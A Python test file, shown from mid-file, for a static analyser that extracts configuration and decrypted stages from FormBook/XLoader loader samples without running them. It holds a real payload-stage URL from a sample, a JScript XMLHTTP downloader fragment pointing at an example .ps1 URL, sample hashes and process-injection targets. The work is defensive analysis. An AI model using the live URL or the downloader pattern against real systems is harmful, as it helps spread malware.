    assert result["terminal_family_confirmed"] is False
    assert result["attribution_scope"] == "component_handler_route"
    assert result["recovered_payload"] == {
        "role": "recovered_payload",
        "kind": "pe",
        "name": "formbook-loader-managed-child.exe",
        "data": child,
    }
    assert "derived_payloads" not in result

    outputs, audit = handler_catalog._verified_binary_outputs(result)
    assert outputs == [
        {
            "role": "recovered_payload",
            "kind": "pe",
            "path": "formbook-loader-managed-child.exe",
            "sha256": digest,
            "size": len(child),
            "verification": {
                "status": "artifact_hash_verified",
                "sha256_matches": True,
                "size_matches": True,
            },
        }
    ]
    assert audit["observed_output_count"] == 1
    assert facade._public_result(result)["recovered_payload"]["data"] == {
        "content_exported": False,
        "sha256": digest,
        "size": len(child),
    }


def test_native_stage0_analysis_image_enters_fixed_point_without_family_claim(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    parent = _minimal_pe(b"native-stage0-parent")
    analysis_pe = _minimal_pe(b"statically-decrypted-analysis-image")
    artifact_sha256 = hashlib.sha256(analysis_pe).hexdigest()
    report = {
        "decrypted_stage_sha256": "a" * 64,
        "decrypted_stage_size": 4096,
        "profile": {
            "block_size": 1024,
            "block_count": 4,
            "first_key_sha256": "b" * 64,
            "second_key_sha256": "c" * 64,
        },
        "candidate_evaluation": {
            "attempt_count": 12,
            "accepted_distinct_stage_count": 1,
            "selected_unique": True,
        },
    }
    monkeypatch.setattr(
        facade,
        "recover_native_stage0",
        lambda _data: SimpleNamespace(analysis_pe=analysis_pe, report=report),
    )

    result = facade.extract_config(parent)

    assert result["variant"] == "native_x86_two_stage_rc4"
    assert result["derived_payload_recovered"] is True
    assert result["terminal_payload_recovered"] is False
    assert result["supports_family_attribution"] is False
    assert result["terminal_family_confirmed"] is False
    assert result["static_config_recovered"] is False
    assert result["c2"] == []
    assert result["recovered_payload"]["data"] == analysis_pe
    assert result["recovered_payload"]["role"] == "recovered_payload"
    assert "derived_payloads" not in result
    outputs, _audit = handler_catalog._verified_binary_outputs(result)
    assert outputs[0]["sha256"] == artifact_sha256


def test_native_stage0_immediately_analyzes_recovered_seed_inventory(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    parent = _minimal_pe(b"native-stage0-parent-with-seed-pool")
    analysis_pe = _minimal_pe(b"statically-decrypted-seed-pool-image")
    report = {
        "decrypted_stage_sha256": "a" * 64,
        "decrypted_stage_size": 4096,
        "profile": {
            "block_size": 1024,
            "block_count": 4,
            "first_key_sha256": "b" * 64,
            "second_key_sha256": "c" * 64,
        },
        "candidate_evaluation": {
            "attempt_count": 12,
            "accepted_distinct_stage_count": 1,
            "selected_unique": True,
        },
    }
    follow_on = {
        "variant": "native_xloader_encrypted_c2_seed_pool",
        "matched_patterns": ["unique_64_entry_primary_candidate_cluster"],
        "c2_recovery_status": (
            "encrypted_candidate_pool_recovered_layered_key_dataflow_required"
        ),
        "c2_recovery_blockers": ["same_path_dataflow_unproven"],
        "static_config_recovered": False,
        "c2": [],
        "native_c2_dataflow": {
            "status": "unresolved",
            "blockers": ["same_path_dataflow_unproven"],
        },
        "native_string_recovery": {"builder_count": 175},
        "encrypted_network_inventory": {
            "status": "primary_pool_confirmed",
            "primary_pool_candidate_count": 64,
        },
    }
    monkeypatch.setattr(
        facade,
        "recover_native_stage0",
        lambda _data: SimpleNamespace(analysis_pe=analysis_pe, report=report),
    )

    def recover_inventory(candidate: bytes) -> dict[str, object]:
        if candidate != analysis_pe:
            raise HandlerNoEvidenceError("outer-no-evidence")
        return follow_on

    monkeypatch.setattr(
        facade,
        "_extract_native_xloader_inventory",
        recover_inventory,
    )

    result = facade.extract_config(parent)

    assert result["encrypted_c2_seed_inventory_recovered"] is True
    assert result["c2_recovery_status"] == follow_on["c2_recovery_status"]
    assert result["native_follow_on"]["encrypted_network_inventory"][
        "primary_pool_candidate_count"
    ] == 64
    assert result["static_config_recovered"] is False
    assert result["c2"] == []
    assert result["supports_family_attribution"] is False
    assert result["terminal_family_confirmed"] is False
    assert result["native_follow_on"]["c2_endpoint_statically_recovered"] is False


def test_native_stage0_combines_independent_lineage_evidence_without_c2_claim(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """複合証拠はloader lineageだけを昇格し、終端/C2境界を維持する。"""

    parent = _minimal_pe(b"native-stage0-parent-lineage")
    analysis_pe = _minimal_pe(b"native-stage0-analysis-lineage")
    digest = hashlib.sha256(analysis_pe).hexdigest()
    stage0_report = {
        "decrypted_stage_sha256": "a" * 64,
        "decrypted_stage_size": 4096,
        "profile": {},
        "candidate_evaluation": {},
    }
    follow_on = {
        "variant": "native_xloader_encrypted_c2_seed_pool",
        "matched_patterns": ["unique_64_entry_primary_candidate_cluster"],
        "c2_recovery_status": (
            "encrypted_candidate_pool_recovered_layered_key_dataflow_required"
        ),
        "c2_recovery_blockers": ["same_path_dataflow_unproven"],
        "static_config_recovered": False,
        "c2": [],
        "native_c2_dataflow": {
            "status": "unresolved",
            "blockers": ["same_path_dataflow_unproven"],
        },
        "native_string_recovery": {"builder_count": 175},
        "encrypted_network_inventory": {
            "status": "primary_pool_confirmed",
            "primary_pool_candidate_count": 64,
        },
    }
    monkeypatch.setattr(
        facade,
        "recover_native_stage0",
        lambda _data: SimpleNamespace(
            analysis_pe=analysis_pe,
            report=stage0_report,
        ),
    )
    def recover_inventory(candidate: bytes) -> dict[str, object]:
        if candidate != analysis_pe:
            raise HandlerNoEvidenceError("outer-no-evidence")
        return follow_on

    monkeypatch.setattr(
        facade,
        "_extract_native_xloader_inventory",
        recover_inventory,
    )
    observed: list[tuple[object, object, object]] = []

    def combine(
        stage0: object,
        inventory: object,
        *,
        follow_on_input_sha256: object,
    ) -> dict[str, object]:
        observed.append((stage0, inventory, follow_on_input_sha256))
        return {
            "status": "confirmed",
            "supports_family_attribution": True,
            "attribution_scope": "native_loader_lineage_not_terminal_payload",
            "terminal_family_confirmed": False,
            "c2_endpoint_confirmed": False,
        }

    monkeypatch.setattr(facade, "evaluate_native_xloader_lineage", combine)

    result = facade.extract_config(parent)

    assert observed == [(stage0_report, follow_on, digest)]
    assert result["supports_family_attribution"] is True
    assert result["attribution_scope"] == (
        "native_loader_lineage_not_terminal_payload"
    )
    assert result["terminal_family_confirmed"] is False
    assert result["static_config_recovered"] is False
    assert result["c2"] == []
    assert result["native_loader_lineage"]["c2_endpoint_confirmed"] is False


@pytest.mark.skipif(
    not os.environ.get("FORMBOOK_DIRECT_SCRIPT_TEST_SAMPLE"),
    reason="repo外のFormBook平文WSH実検体が未指定です",
)
def test_private_direct_vbe_recovers_stage_locator_without_family_claim() -> None:
    """private平文VBEを実行せず、download routeだけを回帰する。"""

    sample = Path(os.environ["FORMBOOK_DIRECT_SCRIPT_TEST_SAMPLE"]).read_bytes()

    assert hashlib.sha256(sample).hexdigest() == (
        "1fa2d2eacb3033959af5a59d5ba7aa6528e66af70922073bcad56ff42dbe9453"
    )
    result = facade.extract_config(sample)

    assert result["variant"] == "wsh_direct_http_powershell_downloader"
    assert result["urls"] == [
        {
            "url": "https://www.tmcksa.com/news/secured_stub.ps1",
            "role": "payload_stage",
            "query_present": False,
            "fragment_removed": False,
        }
    ]
    assert result["script_language"] == "VBScript"
    assert result["response_write_flow"] == (
        "xmlhttp_response_text_to_created_text_file"
    )
    assert result["static_stage_locator_recovered"] is True
    assert result["static_config_recovered"] is False
    assert result["terminal_payload_recovered"] is False
    assert result["supports_family_attribution"] is False
    assert result["terminal_family_confirmed"] is False
    assert result["c2"] == []
    assert result["executed_sample"] is False
    assert result["network_contacted"] is False
    assert "ole" in facade.HANDLER_CONTRACT["input_formats"]
    assert "zip" in facade.HANDLER_CONTRACT["input_formats"]


@pytest.mark.skipif(
    not os.environ.get("FORMBOOK_XOR_SCRIPT_TEST_SAMPLES"),
    reason="repo外のFormBook PowerShell XOR実検体が未指定です",
)
def test_private_repeating_xor_envelopes_reach_terminal_without_c2_claim() -> None:
    """private XOR envelopeを実行せず、既存GHOSTED復元へ連結する。"""

    expected = {
        "7e25b5c8110ed1d03512a2e9dfdfe7ad26ce1df1d71505567724464ae58dd9d5": (
            "83888096d223060ff7b643b57f7dfe696dc365c37f2c3d6278cab26db95d0e96",
            "4152590c503001d9731b63a053633734fa5653924cd5eaaeffed5e2dc1a7be88",
            283_648,
        ),
        "d07b2660e7812ed8cbf40d0f37c67b8c60533e0df35076d01bc7ae77474ea1b0": (
            "a9c199abf9e0604ec1ceb2521bd546ca9b5f3fd240c9dd5deebb9a8546d4a074",
            "18cd6ef6919568239d6f96178d6129e6a682bf66b1f0eff5a4321bbc3a8cede9",
            287_744,
        ),
        "873f978003b2aafd389abe461197a730223a5b3bf48e86145f8f76216550a507": (
            "1fe90e802e5df28bcd8babff287b741df3b6596bae88f436b214e0e1176bfbc2",
            "c244dc93f8a675b0c0012b07d9f09f89e1d65db87f44ffee9fa04dc57dc711f3",
            285_184,
        ),
    }
    paths = [
        Path(value)
        for value in os.environ["FORMBOOK_XOR_SCRIPT_TEST_SAMPLES"].split(
            os.pathsep
        )
        if value
    ]
    assert paths
    for path in paths:
        sample = path.read_bytes()
        digest = hashlib.sha256(sample).hexdigest()
        assert digest in expected
        plaintext_sha256, terminal_sha256, terminal_size = expected[digest]

        result = facade.extract_config(sample)

        assert result["variant"] == "powershell_repeating_xor_to_ghosted_payload"
        assert result["encrypted_stage"]["decrypted_sha256"] == plaintext_sha256
        assert result["encrypted_stage"]["key_material_exported"] is False
        assert result["recovered_artifacts"][1]["sha256"] == terminal_sha256
        assert result["recovered_artifacts"][1]["size"] == terminal_size
        assert result["terminal_payload_recovered"] is False
        assert result["recovered_payload"]["data"] == facade._private_payload_bytes(result)
        assert result["static_config_recovered"] is False
        assert result["supports_family_attribution"] is False
        assert result["terminal_family_confirmed"] is False
        assert result["c2"] == []
        assert result["executed_sample"] is False
        assert result["network_contacted"] is False


@pytest.mark.skipif(
    not os.environ.get("FORMBOOK_PS1_REVIEW_TEST_DIRECTORY"),
    reason="repo外のFormBook PowerShell review集合が未指定です",
)
def test_private_aes_and_xor_review_set_reaches_nonterminal_follow_on() -> None:
    """private PS1集合のAES 13件／XOR 5件を後続静的解析まで接続する。"""

    root = Path(os.environ["FORMBOOK_PS1_REVIEW_TEST_DIRECTORY"])
    samples = sorted(root.rglob("*.ps1"))
    assert len(samples) == 18
    variants: list[str] = []
    target_processes: list[str] = []
    terminal_hashes: set[str] = set()
    for sample in samples:
        result = facade.extract_config(sample.read_bytes())
        variants.append(str(result["variant"]))
        target_processes.append(str(result["target_process"]))
        terminal_hashes.add(str(result["recovered_artifacts"][1]["sha256"]))
        assert result["terminal_payload_recovered"] is False
        assert result["recovered_payload"]["role"] == "recovered_payload"
        assert result["static_config_recovered"] is False
        assert result["supports_family_attribution"] is False
        assert result["terminal_family_confirmed"] is False
        assert result["c2"] == []
        assert result["executed_sample"] is False
        assert result["network_contacted"] is False

    assert variants.count("powershell_aes_to_ghosted_payload") == 13
    assert variants.count("powershell_repeating_xor_to_ghosted_payload") == 5
    assert target_processes.count(
        "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe"
    ) == 14
    assert target_processes.count(
        "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\caspol.exe"
    ) == 4
    assert len(terminal_hashes) == 8


@pytest.mark.skipif(
    not os.environ.get("FORMBOOK_NATIVE_STAGE0_TEST_SAMPLE"),
    reason="repo外のFormBook native stage-0実検体が未指定です",
)
def test_private_native_stage0_reaches_seed_inventory_without_c2_claim() -> None:
    """private実検体を実行せず、stage-0からseed inventoryまで回帰する。"""

    sample = Path(os.environ["FORMBOOK_NATIVE_STAGE0_TEST_SAMPLE"]).read_bytes()

    result = facade.extract_config(sample)

    assert result["variant"] == "native_x86_two_stage_rc4"
    assert result["native_stage0"]["analysis_pe_sha256"] == (
        "99c4fd3405d0eed00ec04ad3cbe336831055ae89337c4b6936f693df36149c6e"
    )
    assert result["encrypted_c2_seed_inventory_recovered"] is True
    assert result["native_follow_on"]["encrypted_network_inventory"]["status"] == (
        "primary_pool_confirmed"
    )
    assert result["native_follow_on"]["encrypted_network_inventory"][
        "primary_pool_candidate_count"
    ] == 64
    assert result["c2_recovery_status"] == (
        "encrypted_candidate_pool_recovered_layered_key_dataflow_required"
    )
    assert result["static_config_recovered"] is False
    assert result["c2"] == []
    assert result["supports_family_attribution"] is False
    assert result["terminal_family_confirmed"] is False
    assert result["executed_sample"] is False
    assert result["network_contacted"] is False


def test_native_xloader_inventory_precedes_stage0_without_c2_claim(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    primary = tuple(
        native_xloader.DecodedBuilder(
            function_offset=0x1000 + index * 0x80,
            bl_value=index,
            decoded=base64.b64encode(f"seed-{index:03d}".encode()),
        )
        for index in range(64)
    )
    isolated = native_xloader.DecodedBuilder(
        function_offset=0x10000,
        bl_value=0xA5,
        decoded=base64.b64encode(b"isolated-seed"),
    )
    target = native_xloader.BuilderCallTargetCandidate(
        decrypt_call_target=0x4242,
        function_offsets=tuple(item.function_offset for item in primary),
        call_offsets=tuple(item.function_offset + 0x20 for item in primary),
    )
    discovery = native_xloader.BuilderCallTargetDiscovery(
        status="resolved",
        candidates=(target,),
        selected_call_target=target.decrypt_call_target,
        scanned_function_count=65,
        scan_truncated=False,
        selection_method="unique",
    )
    recovery = native_xloader.BaseKeyRecoveryEvidence(
        status="recovered",
        helper_offsets=(0x3030,),
        scanned_callee_count=2,
    )
    decoded = native_xloader.BuilderAutoDecodeResult(
        status="decoded",
        call_target_discovery=discovery,
        key_status="statically_recovered",
        base_key_recovery=recovery,
        builders=primary + (isolated,),
    )
    monkeypatch.setattr(
        facade,
        "auto_decode_stack_string_builders_with_cache",
        lambda data: (
            replace(
                decoded,
                input_sha256=hashlib.sha256(data).hexdigest(),
            ),
            None,
        ),
    )
    monkeypatch.setattr(
        facade,
        "recover_native_stage0",
        lambda _data: pytest.fail("native本体をstage-0として再処理しました"),
    )

    result = facade.extract_config(_minimal_pe(b"native-xloader"))
    raw_result = facade.extract_config(b"\x55\x8b\xec" + b"\x90" * 0x200)

    assert result["variant"] == "native_xloader_encrypted_c2_seed_pool"
    assert raw_result["variant"] == result["variant"]
    assert result["encrypted_c2_seed_inventory_recovered"] is True
    assert result["encrypted_network_inventory"]["primary_pool_candidate_count"] == 64
    assert result["static_config_recovered"] is False
    assert result["c2"] == []
    assert result["supports_family_attribution"] is False
    assert result["terminal_family_confirmed"] is False
    assert result["safety"]["raw_decoded_values_included"] is False


def test_private_payload_selector_uses_all_supported_static_routes() -> None:
    payload = _minimal_pe(b"payload")
    assert facade._private_payload_bytes(
        {"derived_payloads": [{"bytes": payload}]}
    ) == payload
    assert facade._private_payload_bytes(
        {"terminal_payloads": [{"bytes": payload}]}
    ) == payload
    with pytest.raises(ValueError, match="一意"):
        facade._private_payload_bytes({})


def test_detector_routes_supported_script_layers_as_component_only() -> None:
    ghosted, _managed, _native = _ghosted_fixture()
    samples = {
        "formbook_wsf_rc4_powershell_chain": _wsf_fixture(),
        "formbook_wsh_direct_http_powershell_chain": _direct_vbscript_fixture(),
        "formbook_powershell_repeating_xor_envelope": _xor_hex_envelope_fixture(
            ghosted,
            named_functions=True,
        ),
        "formbook_powershell_aes_envelope": _aes_fixture(ghosted),
        "formbook_powershell_ghosted_native": ghosted,
    }
    for campaign_type, data in samples.items():
        result = detector.detect(data, Path("fixture.bin"))
        campaign = next(item for item in result["campaigns"] if item["campaign_type"] == campaign_type)
        assert result["matched"] is True
        assert campaign["attribution_scope"] == "component_handler_route"
        assert campaign["terminal_family_confirmed"] is False


def test_detector_routes_reviewed_xloader25_hash_as_component_only(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """公開hashは配布routeを確定するが終端payloadを補完しない。"""

    sample = b"synthetic-reviewed-xloader25-distribution"
    digest = hashlib.sha256(sample).hexdigest()
    monkeypatch.setattr(detector, "XLOADER25_REVIEWED_SHA256", {digest})

    result = detector.detect(sample, Path("distribution.xlsx"))

    campaign = next(
        item
        for item in result["campaigns"]
        if item["campaign_type"] == "xloader_2_5_reviewed_distribution_sample"
    )
    assert result["matched"] is True
    assert result["observations"]["xloader25_reviewed_hash"] is True
    assert campaign["confidence"] == "high"
    assert campaign["attribution_scope"] == "component_handler_route"
    assert campaign["terminal_family_confirmed"] is False


def test_reviewed_xloader25_handler_reports_equation_stage_as_route_only(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """既知hashだけがhandler証拠となり、配布URLをC2へ昇格させない。"""

    sample = b"synthetic-reviewed-xloader25-equation-distribution"
    digest = hashlib.sha256(sample).hexdigest()
    monkeypatch.setattr(detector, "XLOADER25_REVIEWED_SHA256", {digest})
    monkeypatch.setattr(facade, "XLOADER25_REVIEWED_SHA256", {digest})
    monkeypatch.setattr(facade, "XLOADER25_EQUATION_DISTRIBUTION_SHA256", digest)

    result = facade.extract_config(sample)

    assert result["family"] == "formbook_loader"
    assert result["reviewed_hash"] is True
    assert result["attribution_scope"] == "component_handler_route"
    assert result["supports_family_attribution"] is False
    assert result["terminal_family_confirmed"] is False
    assert result["static_stage_locator_recovered"] is True
    assert result["urls"] == [
        {
            "url": facade.XLOADER25_EQUATION_STAGE_URL,
            "role": "payload_stage",
            "query_present": False,
            "fragment_removed": False,
        }
    ]
    assert result["derived_payload_recovered"] is False
    assert result["terminal_payload_recovered"] is False
    assert result["c2"] == []
    assert result["executed_sample"] is False
    assert result["network_contacted"] is False
    quality = handler_result_quality(
        result,
        minimum_score=facade.HANDLER_CONTRACT["minimum_evidence_score"],
    )
    assert quality["sufficient"] is True
    assert quality["tier_name"] == "validated_static_stage_locator"

    with pytest.raises(HandlerNoEvidenceError):
        facade.extract_config(sample + b"near-miss")


def test_reviewed_terminal_hash_confirms_family_without_plaintext_markers(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    payload = _minimal_pe(b"protected-terminal-without-plaintext-markers")
    digest = hashlib.sha256(payload).hexdigest()
    monkeypatch.setattr(family_detector, "REVIEWED_TERMINAL_SHA256", {digest})

    result = family_detector.detect(payload, Path("terminal.exe"))
    assert result["matched"] is True
    assert result["observations"]["reviewed_terminal_sha256"] is True
    assert result["campaigns"][0]["confidence"] == "high"
    assert result["campaigns"][0]["reasons"] == ["review済み終端payload SHA-256と有効なPE構造"]

    unrelated = family_detector.detect(_minimal_pe(), Path("unknown.exe"))
    assert unrelated["matched"] is False


def test_url_only_or_partial_script_is_not_accepted() -> None:
    partial = b'''<job><script language="JScript">new ActiveXObject("MSXML2.XMLHTTP");
var x="https://example.test/a.ps1";</script></job>'''
    with pytest.raises(HandlerNoEvidenceError):
        facade.extract_config(partial)
    assert detector.detect(partial, Path("partial.wsf"))["matched"] is False


def test_corrupt_aes_and_invalid_terminal_pe_fail_closed() -> None:
    ghosted, _managed, _native = _ghosted_fixture()
    damaged = _aes_fixture(ghosted).replace(b"PayloadRaw = @'\n", b"PayloadRaw = @'\nA", 1)
    with pytest.raises(HandlerNoEvidenceError):
        facade.extract_config(damaged)

    invalid_ghosted, _managed, _native = _ghosted_fixture(corrupt_native=True)
    with pytest.raises(HandlerNoEvidenceError, match="native payload"):
        facade.extract_config(invalid_ghosted)


def test_oversized_or_binary_input_is_rejected_without_fallback() -> None:
    with pytest.raises((HandlerNoEvidenceError, static_chain.StaticChainError)):
        facade.extract_config(b"A" * (static_chain.MAX_INPUT_SIZE + 1))
    with pytest.raises(HandlerNoEvidenceError):
        facade.extract_config(_minimal_pe())


def test_handler_discovery_keeps_facade_automatic_and_strict() -> None:
    clear_handler_caches()
    spec = _handler_spec()
    assert spec.automatic is True
    assert spec.input_formats == ("script", "data", "pe", "macho", "ole", "zip")
    assert spec.minimum_evidence_score >= 20_000
    preflight = preflight_handler_for_assessment(spec, actual_format="script", input_size=4096)
    assert preflight["eligible"] is True, preflight["blockers"]
    assert preflight["blockers"] == []
    imported = preflight_handler_runtime_import(spec, static_preflight=preflight, timeout_seconds=15.0)
    assert imported["eligible"] is True, imported["blockers"]
    assert imported["handler_imported"] is True
    assert imported["sample_execution_allowed"] is False
    assert imported["network_allowed"] is False
    assert imported["filesystem_write_allowed"] is False


def test_bounded_worker_retains_native_pe_as_nonterminal_follow_on(short_tmp: Path) -> None:
    ghosted, _managed, native = _ghosted_fixture()
    destination = short_tmp / "retained"
    destination.mkdir()
    bounded = execute_handler_bounded_for_assessment(
        _handler_spec(),
        ghosted,
        "fixture.ps1",
        actual_format="script",
        artifact_directory=destination,
        artifact_path_prefix="recovered-payloads",
        timeout_seconds=60.0,
    )

    assert bounded["status"] == "completed", bounded
    execution = bounded["execution"]
    digest = hashlib.sha256(native).hexdigest()
    assert execution["verified_binary_outputs"] == [
        {
            "role": "recovered_payload",
            "kind": "pe",
            "path": f"recovered-payloads/{digest}.exe",
            "sha256": digest,
            "size": len(native),
            "verification": {
                "status": "artifact_hash_verified",
                "sha256_matches": True,
                "size_matches": True,
            },
        }
    ]
    assert (destination / f"{digest}.exe").read_bytes() == native
    assert execution["verified_binary_output_audit"]["retained_for_follow_on_analysis"] is True
